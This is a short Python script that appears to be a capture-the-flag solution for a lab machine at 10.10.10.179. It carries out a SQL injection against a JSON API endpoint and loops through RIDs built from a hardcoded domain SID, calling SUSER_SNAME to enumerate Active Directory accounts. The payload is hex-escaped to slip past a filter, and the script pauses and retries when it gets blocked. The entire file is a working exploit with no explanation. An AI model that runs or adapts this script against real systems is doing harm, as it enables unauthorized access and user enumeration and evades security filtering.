import requests
import json
import re
import time

url = "http://10.10.10.179/api/getColleagues"

for x in range(1100,11000,1000):
    for inc in range(100):
        domain_SID = '0x0105000000000005150000001C00D1BCD181F1492BDFC236'
        temp = '0' + hex((x+inc))[2:].upper() 
        byteArray = bytearray.fromhex(temp)
        byteArray.reverse()
        reversed = ''.join('%02x'%i for i in byteArray).upper() 
        RID = domain_SID + reversed + 4 * '0'
        query = "a'UNION ALL SELECT 1,2,3,4,SUSER_SNAME("+RID+")-- -"
        pattern = re.compile(r'([0-9a-f]{2})')
        query = pattern.sub(r"\\u00\1", query.encode('hex'))
        queryData = '{"name": "'+query+'"}'
        res = requests.post(url, data= queryData, headers={"Content-Type":"application/json;charset=utf-8"})
        if res.status_code == 403:
                        print("we are blocked,waiting...")
                        time.sleep(15)
                        continue
        jsonData = json.loads(res.content)
        formated = json.dumps(jsonData, indent=4, sort_keys=True)
        print(formated)
